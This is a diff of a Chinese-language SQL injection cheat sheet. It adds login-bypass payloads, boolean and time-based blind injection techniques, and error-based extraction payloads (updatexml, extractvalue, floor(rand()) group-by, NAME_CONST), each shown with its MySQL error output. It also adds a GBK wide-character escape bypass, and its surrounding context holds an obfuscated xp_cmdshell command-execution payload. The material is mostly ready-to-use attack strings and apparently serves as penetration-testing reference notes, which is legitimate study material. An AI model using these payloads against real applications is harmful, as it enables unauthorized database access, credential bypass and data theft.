@@ -22,18 +22,37 @@ database() 数据库名称
 system_user() 系统用户名
 current_user() 当前用户名
 session_user() 连接数据库的用户名
-floor() 取整
-rand() 随机0-1
 concat("abc","123")=abc123
 concat("abc",0x22,"123")=abc"123
 ```
 ### 万能密码
-`'or 1#`  
+```
+'or 1# 
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+以不同的用户登陆 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+```
+
 其他待补充 
+### bool型注入
+一般适用于无回显消息，但是错误的话，页面会不正确的情况，而延时注入适用于在sql语句错误时页面还正常的情况。  
 
-### 手工注入
-
+常用函数:
+- Length()函数 返回字符串的长度
+- Substr()截取字符串
+- Ascii()返回字符的ascii码
+- if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
+### 延时注入
 ```sql
+(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false))
+-- BENCHMARK()
+
 select sleep(if(length(@@version)=6,20,0));
 --长度为6 sleep 2秒，否则0秒。
 
@@ -57,7 +76,7 @@ group_concat()
 --函数让检索出来的语句以行的形式显示。如果不用这个函数，就不会看到输出结果。 
 
 ```
-### 延时注入
+
 ```py
 import requests
 import string
@@ -77,6 +96,63 @@ for i in range(33):
     print "flag:",flag
     break
 print "result:"+flag
+```
+
+### 报错注入
+
+```sql
+// mysql<5.5.47
+select (select(!x-~0)from(select(select user())x)a);
+--- ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
+```
+从mysql5.1.5开始提供两个[XML查询和修改的函数](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html)，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容,它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：
+
+```sql
+select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
+--- ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
+select extractvalue(1,concat(0x7e,(select @@version),0x7e));
+--- ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
+```
+
+主键重复:实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关,常见的payload
+```sql
+select count(*) from test group by concat(version(),floor(rand(0)*2));
+-- ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'
+select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
+-- ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'
+
+
+--- 查询数据库的个数：
+select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata
+--- payload组合语句：
+and (select 1 from (select count(),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+
+--- 获取数据库名字：
+select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1
+---payload组合语句：
+and (select 1 from (select count(),concat((select (select (select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+```
+
+mysql列名重复会报错
+```sql
+select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
+--- ERROR 1060 (42S21): Duplicate column name '5.7.17'
+
+select *  from(select * from test a join test b)c;
+--- ERROR 1060 (42S21): Duplicate column name 'id'
+select *  from(select * from test a join test b using(id))c;
+--- ERROR 1060 (42S21): Duplicate column name 'name'
+
+```
+几何函数：`geometrycollection()`，`multipoint()`，`polygon()`，`multipolygon()`，`linestring()`，`multilinestring()`:
+```sql
+
+-- 5.5.47
+select multipoint((select * from (select * from (select version())a)b));
+ERROR 1367 (22007): Illegal non geometric '(select `b`.`version()` from ((select '5.5.47' AS `version()` from dual) `b`))' value found during parsing
+-- 5.7.17
+select multipoint((select * from (select * from (select version())a)b));
+-- ERROR 1367 (22007): Illegal non geometric '(select `a`.`version()` from ((select version() AS `version()`) `a`))' value found during parsing
 ```
 
 ### sqlmap  
@@ -135,6 +211,10 @@ xx.asp?0day5.com=%00.&xw_id=69%20 and 1=1和xx.asp?0day5.com=%00.&xw_id=69%20 an
 ```
 cnseay.com/1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')
 ```
+
+7. 宽字符注入  
+这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠 \ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
+
 ### sqlmap 自带的绕过脚本 --tamper详解  
 ```
 (1) apostrophemask.py UTF-8编码 
@@ -360,7 +440,3 @@ username=a'+0;%00&password=
 
 
 ## 其他
-
-1. 域传送:dnsenum -enum xxx.com 检测域传送
-2. http://www.dmzlab.com/77396.html  
-3. 宽字符注入：'aaa%df' WHERE 1=1 --' 
